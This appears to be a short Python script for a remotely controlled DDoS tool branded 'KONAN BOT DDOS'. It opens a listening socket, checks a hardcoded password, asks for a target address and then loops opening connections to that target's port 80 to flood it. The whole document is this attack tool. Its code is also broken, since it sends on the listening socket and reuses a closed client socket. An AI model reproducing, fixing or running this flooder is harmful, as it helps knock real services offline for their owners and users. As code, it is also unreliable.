from socket import *
import time
import os

server = '0.0.0.0'
port = 22359

socketServidor = socket( AF_INET, SOCK_STREAM)
socketServidor.bind( ( server, port ) )
socketServidor.listen()
while True:
  socketConexion, addr = socketServidor.accept()
  print (addr)
  socketServidor.send('================================='.encode())
  socketServidor.send('login'.encode())
  socketServidor.send('================================='.encode())
  socketServidor.send('login: '.encode())
  passwd = socketServidor.recv(2048).decode()
  if passwd == 'konanbot':
     socketServidor.send('   KONAN BOT DDOS'.encode())
     socketServidor.send('ddos attack by zkira'.encode())
     promt = 'objetivo: '
     socketServidor.send(promt.encode())
     obj = socketServidor.recv(2048).decode()
     socketServidor.send('atacando...'.encode())
     cliente = socket.socket()
     while True:
       cliente.connect((obj, 80))
       cliente.close()
